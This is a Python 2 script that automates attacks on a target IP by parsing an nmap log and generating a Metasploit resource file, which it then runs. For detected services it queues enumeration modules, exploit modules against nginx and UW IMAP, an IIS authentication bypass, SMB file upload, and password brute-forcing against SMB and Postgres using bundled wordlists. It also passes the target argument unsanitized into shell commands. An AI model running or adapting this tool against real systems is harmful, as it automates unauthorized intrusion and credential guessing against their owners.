#!/usr/bin/env python
# -----------------------------------------------------------
# bikoz.py - 'quick&dirty' generator for msfconsole
# -----------------------------------------------------------
# v0.01 @ 20.07.2016 --- code610 blogspot com
# -----------------------------------------------------------
#
# run: ./bikoz.py IP
#      ./bikoz.py IP > log.txt
#
# idea:
#   - run nmap against host/IP
#   - grep log for open ports
#   - if port open, choose payload from msf and run
#
# hint: read the source to see how you can add
# new sploits or scanner modules. its just a skeleton.
# -----------------------------------------------------------
#

import sys
import subprocess

# -----------------------------------------------------------
# defines:
target=sys.argv[1]
nmapLog = 'target.nmap'         # nmap txt log file (-oN)
rcfile = 'code610.rc'             # output for msf
msf='msfconsole -r ' + rcfile   # runme now
passwdFile = '/usr/share/metasploit-framework/data/wordlists/root_userpass.txt'

# -----------------------------------------------------------
# functions
def hello():
  print '*'*60
  print '\t............-=[ bikoz ]=-............'
  print '*'*60


def scanThis(target):
  print '[i] Mod: scanThis vs. %s' % target
  tryNmap = 'nmap -sV -T5 -A -P0 -vvv -n -oN %s %s' % (nmapLog, target)
  subprocess.call([ tryNmap ], shell=True)
  print '[i] Mod: scanThis: done.\n'


def saveMe(line):
  fp = open(rcfile,'a+')
  fp.write(line)
  fp.close()


def grabPorts(nmapLog):
  print '[i] Mod: grabPorts'
  fp = open(nmapLog,'r')
  lines = fp.readlines()

  for line in lines:
    if line.find('/tcp') != -1:

      if line.find('21/tcp') != -1:
        print '[+] Found FTP...'
        saveMe('use auxiliary/scanner/ftp/anonymous\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/ftp/ftp_version\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 22/tcp open:
      if line.find('22/tcp') != -1:
        print '[+] Found SSH...'
        saveMe('use auxiliary/scanner/ssh/ssh_version\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

#        # only if you need bruteforce
#        saveMe('use auxiliary/scanner/ssh/ssh_login\n')
#        saveMe('set RHOSTS ' + target + '\n')
#        saveMe('set USERPASS_FILE ' + passwdFile + '\n')
#        saveMe('run\n')


      # port 80/tcp open:
      elif line.find('80/tcp') != -1:

        print '[+] Found HTTP...'

        if line.find('Apache') != -1:
          print '[+] Found Apache...'
          saveMe('use auxiliary/scanner/http/apache_userdir_enum\n')
          saveMe('set RHOSTS ' + target + '\n')
          saveMe('run\n')

        elif line.find('IIS') != -1:
          print '[+] Found IIS...'
          saveMe('use auxiliary/admin/http/iis_auth_bypass\n')
          saveMe('set RHOST ' + target + '\n')
          saveMe('run\n')


          saveMe('use auxiliary/scanner/http/iis_internal_ip\n')
          saveMe('set RHOSTS ' + target + '\n')
          saveMe('run\n')

        elif line.find('nginx') != -1:
          print '[+] Found Nginx...'
          saveMe('use auxiliary/scanner/http/nginx_source_disclosure\n')
          saveMe('set RHOSTS ' + target + '\n')
          saveMe('run\n')

          saveMe('use exploit/linux/http/nginx_chunked_size\n')
          saveMe('set RHOST ' + target + '\n')
          saveMe('run\n')

        # bonus tests for port 80
        saveMe('use auxiliary/scanner/http/options\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/dir_scanner\n')
        saveMe('set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt\n')
        saveMe('set RHOSTS '+ target +'\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/http_header\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 135/tcp open:
      elif line.find('111/tcp') != -1:
        print '[+] Found RPC Portmap...'
        saveMe('use auxiliary/scanner/misc/sunrpc_portmapper\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      elif line.find('135/tcp') != -1:
        print '[+] Found NetBios...'
        saveMe('use auxiliary/scanner/dcerpc/endpoint_mapper\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor\n')     # could be already done if 111/tcp was open
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 139/tcp open:
      elif line.find('139/tcp') != -1:
        print '[+] Found SMB...'
        saveMe('use auxiliary/scanner/smb/smb_enumshares\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/smb/smb_enumusers_domain\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/smb/smb_lookupsid\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 143/tcp open:
      elif line.find('143/tcp') != -1:
        print '[+] Found Imap...'
        saveMe('use auxiliary/scanner/imap/imap_version \n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use exploit/linux/imap/imap_uw_lsub\n')
        saveMe('set RHOST ' + target + '\n')
        saveMe('run\n')


      # port 443/tcp open:
      elif line.find('443/tcp') != -1:
        if line.find('Apache') != -1:
          print '[+] Found HTTPS Apache...'
          saveMe('use auxiliary/scanner/http/apache_userdir_enum\n')
          saveMe('set RHOSTS ' + target + '\n')
          saveMe('set RPORT 443\n')
          saveMe('run\n')
        elif line.find('IIS') != -1:
          print '[+] Found HTTPS IIS...'
          saveMe('use auxiliary/admin/http/iis_auth_bypass\n')
          saveMe('set RHOST ' + target + '\n')
          saveMe('set RPORT 443\n')
          saveMe('run\n')

          saveMe('use auxiliary/scanner/http/iis_internal_ip\n')
          saveMe('set RHOSTS ' + target + '\n')
          saveMe('set RPORT 443\n')
          saveMe('run\n')

        # bonus tests for port 443
        saveMe('use auxiliary/scanner/http/options\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('set RPORT 443\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/dir_scanner\n')
        saveMe('set RHOSTS '+ target +'\n')
        saveMe('set RPORT 443\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/http_header\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('set RPORT 443\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/http_hsts\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/http/dir_scanner\n')
        saveMe('set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt\n')
        saveMe('set RPORT 443\n')
        saveMe('set RHOSTS '+ target +'\n')
        saveMe('run\n')

      # port 445/tcp open:
      elif line.find('445/tcp') != -1:
        print '[+] Found Windows Domain (445)...'
        saveMe('use auxiliary/scanner/smb/smb_version\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/smb/smb2\n')
        saveMe('set RHOSTS '+ target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/admin/smb/upload_file\n')
        saveMe('set LPATH /etc/issue\n')
        saveMe('set RPATH issue.txt\n')
#       saveMe('set SMBSHARE ' + <type here> + '\n')
        saveMe('set RHOST ' + target + '\n')
        saveMe('run\n')

        saveMe('use auxiliary/scanner/smb/smb_login\n')
        saveMe('set USERPASS_FILE ' + passwdFile + '\n')
        saveMe('set SMBUser Administrator\n')
        saveMe('set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 2869/tcp open:
      elif line.find('2869/tcp') != -1:
        print '[+] Found UPnP SSDP ...'
        saveMe('use auxiliary/scanner/upnp/ssdp_msearch\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('run\n')


      # port 5432/tcp open:
      elif line.find('5432/tcp') != -1:
        print '[+] Found Postgres...'
        saveMe('use auxiliary/scanner/postgres/postgres_login\n')
        saveMe('set RHOSTS ' + target + '\n')
        saveMe('set BLANK_PASSWORDS true\n')
        saveMe('set USER_AS_PASS true\n')
        saveMe('run\n')

  # ------------------------
  # bonus: udp test(s)
  saveMe('use auxiliary/scanner/discovery/udp_probe\n')
  saveMe('set RHOSTS ' + target +'\n')
  saveMe('run\n')

  # reading ports finished
  print '[i] Mod: grabPorts: done'



# -----------------------------------------------------------
# main starter:
#

hello()
#scanThis(target)
grabPorts(nmapLog)


print '[+] ...and finally... ;)'
saveMe('quit') # ;)

# g0g0g0
subprocess.call(msf,shell=True)

print '[+] Cleaning...'
subprocess.call(['rm','-rf',rcfile])
print '\n[+] Thanks, bye!\no/'



# -------
# more: http://code610.blogspot.com
#
# cheers
# o/

